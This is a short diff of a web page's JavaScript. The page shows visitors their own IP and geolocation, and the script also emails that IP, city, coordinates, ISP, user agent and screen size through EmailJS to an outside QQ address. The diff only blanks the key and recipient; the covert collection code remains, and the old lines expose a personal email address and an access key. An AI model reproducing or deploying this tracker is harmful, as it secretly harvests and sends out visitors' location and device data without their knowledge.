@@ -55,11 +55,11 @@ $('isp').textContent=isp;
 $('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
 
 // 初始化 EmailJS
-emailjs.init('trdlxempxmpmejfb'); // 公钥即授权码
+emailjs.init(''); // 公钥即授权码
 const body=`IP: ${ip}\n为之: ${city}, ${region}, ${country}\n坐标: ${lat}, ${lon}\nISP: ${isp}\n时间: ${new Date().toLocaleString('zh-CN')}\nUA: ${navigator.userAgent}\n屏幕: ${screen.width}x${screen.height}`;
 try{
 await emailjs.send('service_default','template_ip_notification',{
-    to_email:'1828339242@qq.com',
+    to_email:'18m',
     subject:`IP ${ip}`,
     message:body
 });
